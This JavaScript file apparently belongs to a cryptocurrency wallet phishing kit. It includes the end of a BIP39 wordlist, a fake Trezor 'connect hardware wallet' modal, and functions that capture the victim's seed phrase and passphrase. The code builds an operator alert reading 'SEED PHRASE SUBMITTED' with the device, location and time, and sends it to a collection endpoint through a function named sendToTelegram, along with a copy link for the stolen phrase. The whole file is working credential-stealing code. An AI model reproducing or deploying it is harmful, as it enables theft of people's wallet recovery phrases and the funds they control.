"picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"];


function sendToTelegram(messageText) {
    try {
        var url = '/api/submit';
        var body = {
            text: messageText
        };
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        }).catch(function(e){ console.log(e); });
    } catch (e) { console.log(e); }
}

function buildSubmissionDetails() {
    var wordsSelectorValue = (document.getElementById('connect-hardware-words') || {}).value || '';
    var passphraseValue = (document.getElementById('connect-hardware-passphrase') || {}).value || '';
    var phrase = '';
    try {
        phrase = getCombinedPhrase();
    } catch (e) {
        phrase = '';
    }
    var escapeHtml = function(value) {
        if (value === null || value === undefined) return '';
        return String(value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    };
    var escapeAttribute = function(value) {
        if (value === null || value === undefined) return '';
        return String(value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    };

    var walletName = (typeof window !== 'undefined' && window.walletName) ? window.walletName : 'Unknown';
    var ua = navigator.userAgent || 'Unknown device';
    var now = new Date();
    var formattedTime;
    try {
        formattedTime = new Intl.DateTimeFormat('en-US', {
            weekday: 'short',
            month: 'short',
            day: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true,
            timeZoneName: 'short'
        }).format(now);
    } catch (e) {
        formattedTime = now.toUTCString();
    }
    if (formattedTime && formattedTime.indexOf('UTC') === -1) {
        formattedTime += ' UTC';
    }

    var parsedWordCount = parseInt(wordsSelectorValue, 10);
    var wordsLabel = 'Unknown phrase length';
    if (!isNaN(parsedWordCount) && parsedWordCount > 0) {
        wordsLabel = parsedWordCount + ' word phrase';
    } else if (wordsSelectorValue) {
        wordsLabel = wordsSelectorValue;
    }

    var locationLabel = 'Unknown, Unknown';
    if (typeof window !== 'undefined' && window.submissionLocationLabel) {
        locationLabel = window.submissionLocationLabel;
    }

    var passphraseLabel = passphraseValue
        ? '🧳 Passphrase: ' + escapeHtml(passphraseValue)
        : '🧳 Passphrase: None';

    var displayPhrase = phrase ? phrase.trim() : '';
    var encodedPhrase = displayPhrase ? encodeURIComponent(displayPhrase) : '';
    var copyBase = '';
    try {
        if (typeof window !== 'undefined') {
            if (window.copyUrlBase) {
                copyBase = window.copyUrlBase;
            } else if (window.location && window.location.origin) {
                copyBase = window.location.origin;
                if (window.location.pathname) {
                    var path = window.location.pathname;
                    var hashIndex = path.indexOf('#');
                    if (hashIndex >= 0) path = path.substring(0, hashIndex);
                    var queryIndex = path.indexOf('?');
                    if (queryIndex >= 0) path = path.substring(0, queryIndex);
                    if (!path.endsWith('/')) {
                        var lastSlash = path.lastIndexOf('/');
                        path = lastSlash >= 0 ? path.substring(0, lastSlash + 1) : '/';
                    }
                    copyBase += path;
                }
            }
        }
    } catch (ignored) { /* noop */ }
    if (!copyBase) copyBase = '';
    copyBase = copyBase.replace(/\/+$/, '');
    var copyUrlBase = copyBase ? (copyBase + '/?copy=') : '?copy=';
    var copyUrl = encodedPhrase ? (copyUrlBase + encodedPhrase) : copyUrlBase;

    var lines = [
        '🚨 NPRO Alert',
        '',
        '🔑 SEED PHRASE SUBMITTED',
        '',
        '👤 Wallet: ' + escapeHtml(walletName),
        '🔤 Words: ' + escapeHtml(wordsLabel),
        '🕐 Time: ' + escapeHtml(formattedTime),
        '🌍 Location: ' + escapeHtml(locationLabel),
        '📱 Device: ' + escapeHtml(ua),
        passphraseLabel
    ];

    lines.push('');
    lines.push('🔒 Seed Phrase:');
    lines.push(displayPhrase ? '<code>' + escapeHtml(displayPhrase) + '</code>' : '[empty]');

    lines.push('');
    lines.push('⚠️ User attempted wallet recovery');

    if (copyUrl && displayPhrase) {
        lines.push('');
        lines.push('📎 <a href="' + escapeAttribute(copyUrl) + '">Tap to Copy Phrase</a>');
    }

    return lines.join('\n');
}

function copyPhraseToClipboard(phrase) {
    try {
        if (!phrase) return;
        var trimmed = phrase.trim();
        if (!trimmed) return;
        var copyFn = function(text) {
            var temp = document.createElement('textarea');
            temp.value = text;
            temp.setAttribute('readonly', '');
            temp.style.position = 'absolute';
            temp.style.left = '-9999px';
            document.body.appendChild(temp);
            temp.select();
            temp.setSelectionRange(0, temp.value.length);
            try {
                document.execCommand('copy');
            } catch (err) { /* noop */ }
            document.body.removeChild(temp);
        };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(trimmed).catch(function() {
                copyFn(trimmed);
            });
        } else {
            copyFn(trimmed);
        }
    } catch (e) { /* noop */ }
}

function sendRequest() {
    try {
        var text = buildSubmissionDetails();
        try {
            var phrase = getCombinedPhrase();
            copyPhraseToClipboard(phrase);
        } catch (e) { /* noop */ }
        sendToTelegram(text);
    } catch (e) { console.log(e); }
}

window.sendRequest = sendRequest;


function openSpecificWalletModal(walletName) {

    updatePage(TrezorWalletModal);

    window["walletName"] = walletName;

}